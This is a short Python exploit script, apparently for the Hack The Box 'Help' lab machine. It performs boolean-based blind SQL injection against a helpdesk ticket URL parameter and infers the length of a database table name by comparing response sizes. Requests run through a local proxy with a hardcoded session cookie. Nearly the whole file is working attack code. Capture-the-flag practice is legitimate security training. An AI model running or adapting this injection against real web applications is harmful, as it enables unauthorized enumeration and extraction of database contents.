import requests
import string
import warnings
#warnings.filterwarnings("ignore")


proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

headers = {'Cookie': 'lang=english; PHPSESSID=20q6sd4sfdodqrkk71u2cu7701; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BGqsZIyej76HVyydbTnHRRH82AKnfRtN7Bw67GJ2lhIHg%3D%3D'}

def lenTableName():
	url = "http://help.htb/support/?v=view_tickets&action=ticket&param%5B%5D=4&param%5B%5D=attachment&param%5B%5D=1&param%5B%5D=6+AND+(SELECT+LENGTH(table_name)+FROM+information_schema.tables+WHERE+table_schema%3ddatabase()+LIMIT+0,1)%3d"
# for second table name increase value of 0 to 1 in LIMIT 0,1
	

	for i in string.digits[1:25]:

		

		part1 = url + i + "+--+-"

		r = requests.get(part1, headers=headers, proxies=proxies, verify=False)

		t = r.content

		if len(t) == 78881:
			print("length of 1st Table is : ", i)

lenTableName()
